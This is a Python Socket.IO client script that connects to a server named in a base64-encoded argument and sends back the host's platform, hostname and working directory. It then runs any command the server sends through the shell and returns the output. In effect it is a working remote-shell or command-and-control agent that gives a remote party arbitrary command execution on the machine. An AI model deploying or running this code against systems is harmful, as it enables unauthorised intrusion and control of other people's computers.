import socketio
import base64
import sys
import platform
import subprocess
import os

if len(sys.argv) < 2:
    print("Usage: python client.py <base64_moduleArgs>")
    sys.exit(1)

moduleArgs = sys.argv[1]
decoded = base64.b64decode(moduleArgs).decode()
server_url, options = decoded.split('@@', 1)

client_id = options

print(f"Connecting to {server_url} with ID {client_id}")

sio = socketio.Client()

@sio.event
def connect():
    print("Connected to server")
    # Send initial info
    info = {
        'id': client_id,
        'platform': platform.system(),
        'hostname': platform.node(),
        'cwd': os.getcwd()
    }
    sio.emit('to-server', info)

@sio.event
def disconnect():
    print("Disconnected from server")

@sio.event
def receiver(data):
    print(f"Received command: {data}")
    try:
        if data.get('type') == 'terminal':
            result = subprocess.run(data['command'], shell=True, capture_output=True, text=True, cwd=data.get('cwd', os.getcwd()))
            response = {
                'type': 'terminal',
                'output': result.stdout + result.stderr,
                'cwd': os.getcwd()
            }
            sio.emit('to-server', response)
        # Add other command types here
    except Exception as e:
        sio.emit('to-server', {'type': 'error', 'output': str(e)})

if __name__ == '__main__':
    try:
        sio.connect(server_url, auth={'id': client_id, 'clientType': 'python'}, transports=['polling', 'websocket'])
        sio.wait()
    except Exception as e:
        print(f"Connection failed: {e}")
